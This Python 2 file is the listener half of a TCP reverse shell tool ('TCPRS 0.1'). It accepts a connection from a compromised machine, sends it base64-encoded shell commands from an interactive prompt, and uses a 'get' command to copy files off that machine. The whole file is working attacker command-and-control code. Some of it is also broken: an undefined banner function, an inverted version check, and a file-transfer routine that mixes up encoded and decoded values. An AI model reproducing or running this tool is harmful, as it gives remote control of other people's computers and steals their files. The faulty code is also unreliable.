#!/usr/bin/env python
# -*- coding: utf-8 -*-

#------------------------------------------------------------------------------
# Modules
#------------------------------------------------------------------------------

import socket
import os
import sys
import argparse
import hashlib
import base64

#------------------------------------------------------------------------------
# Python version check.
#------------------------------------------------------------------------------

if __name__ == "__main__":
    if sys.version_info < (2, 7) or sys.version_info >= (3, 0):
        show_banner()
        print ("[!] You must use Python version 2.7 or above")
        sys.exit(1)

#------------------------------------------------------------------------------
# Command line parser using argparse
#------------------------------------------------------------------------------

def cmdline_parser():
	parser = argparse.ArgumentParser(conflict_handler='resolve', add_help=True, description='Example: python %(prog)s -i 1.2.3.4 -p 80', version='TCPRS 0.1',
             usage="python %(prog)s [OPTIONS]")

	parser.add_argument('-i', '--ip', action='store', dest='ip', help='IP')
	parser.add_argument('-p', '--port', action='store', dest='port', help='Port')
	return parser


#------------------------------------------------------------------------------
# Functions
#------------------------------------------------------------------------------

def transfer(connection,command):
    # Encoded with base64
    # Command sent
    encode = base64.b64encode(command)
    connection.send(command)

    # Results
    decode = base64.b64decode(command)
    grab,path = decode.split(' ')
    if ("\\" in path):
        splitpath, splitfile = path.split('\\')
    else:
        splitfile = path

    file = open(splitfile,'wb')
    while True:  
        bits = connection.recv(1024)
        decode = base64.b64decode(bits)
        if 'Unable to find out the file' in decode:
            print '[-] Unable to find out the file'
            break
        if decode.endswith('DONETOREAD'):
            print '[+] Transfer completed ' + path
            file.close()
            break

        # bits sent
        file.write(decode)


def connect(IPconnection,Portconnection):
    # Socket open to listen connections
    socketconnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socketconnection.bind((IPconnection, int(Portconnection)))
    socketconnection.listen(1)
    print "[+] Listening for incoming TCP connections"

    # Connection received from client
    connection, address = socketconnection.accept()
    print "[+] Connection received from: ", address

    while True:       
        command = raw_input("TCP Reverse Shell> ")
        encode = base64.b64encode(command)
        
        if 'terminate' in command:
            connection.send(encode)
            connection.close() 
            break

        elif 'get' in command: 
            transfer(connection,encode)
        else:
            connection.send(encode) 
            en_data=connection.recv(1024)
            decode = base64.b64decode(en_data)
            print decode

#------------------------------------------------------------------------------
# Start of program
#------------------------------------------------------------------------------

def main():
    
    # Get the command line parser.
    parser = cmdline_parser()

    # Show help if no args
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    # Get results line parser.
    results = parser.parse_args()

    print "[+] TCP Server in " + results.ip + " and port " + results.port

    connect(results.ip, results.port)

#------------------------------------------------------------------------------
# Main
#------------------------------------------------------------------------------

if __name__ == '__main__':
	main()